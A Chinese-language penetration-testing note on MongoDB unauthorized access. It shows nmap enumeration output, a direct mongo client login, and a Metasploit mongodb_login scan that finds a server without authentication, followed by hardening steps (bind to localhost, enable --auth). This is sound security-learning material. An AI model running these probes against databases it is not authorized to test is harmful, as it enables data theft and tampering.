---
title: MongoDB
category:
- [Kali, Exploit]

tags:
  - null
date: 2020-12-04 20:23:56
top:
updated:
---

MongoDB 是一个由` C++ `语言编写,  
   基于`分布式文件存储`的数据库,  
   旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。  
   介于`关系数据库和非关系数据库`之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。
   
## 信息收集
```zsh
 sudo nmap -sV -Pn -T4 -sSU -p 27017 --script mongodb-databases   10.196.20.1
 
PORT      STATE         SERVICE VERSION
27017/tcp open          mongodb MongoDB 3.6.12
| mongodb-databases:
|   totalSize = 2633728.0
|   databases
|     0
|       empty = false
|       name = admin
|       sizeOnDisk = 131072.0
|     1
|       empty = false
|       name = config
|       sizeOnDisk = 86016.0
| mongodb-info:
|   MongoDB Build info
|     javascriptEngine = mozjs
|     buildEnvironment
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       target_os = linux
|       target_arch = x86_64
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|       distmod = ubuntu1604
|       distarch = x86_64
|     gitVersion = c2b9acad0248ca06b14ef1640734b5d0595b55f1
|     bits = 64
|     maxBsonObjectSize = 16777216
|     debug = false

```

## MongoDB未授权访问
  开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。  
  造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 --auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。

### MongoDB客户端探测
```zsh
mongo 10.196.20.1:27017
mongodb>show dbs
```

### MSF模块利用

#### MSF登陆模块mongodb_login
```zsh msf
msf6 auxiliary(scanner/mongodb/mongodb_login) > show options

Module options (auxiliary/scanner/mongodb/mongodb_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB                admin            yes       Database to use
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS            10.196.20.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             27017            yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf6 auxiliary(scanner/mongodb/mongodb_login) > run

[*] 10.196.20.1:27017 - Scanning IP: 10.196.20.1
[+] 10.196.20.1:27017 - Mongo server 10.196.20.1 doesn't use authentication
[*] 10.196.20.1:27017 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### 漏洞修复
- 修改默认端口
- 禁止开发服务到公网  
`bind_ip=127.0.0.1`
- 禁用HTTP和REST端口
- 为MongoDB添加认证  
	添加`--auth`参数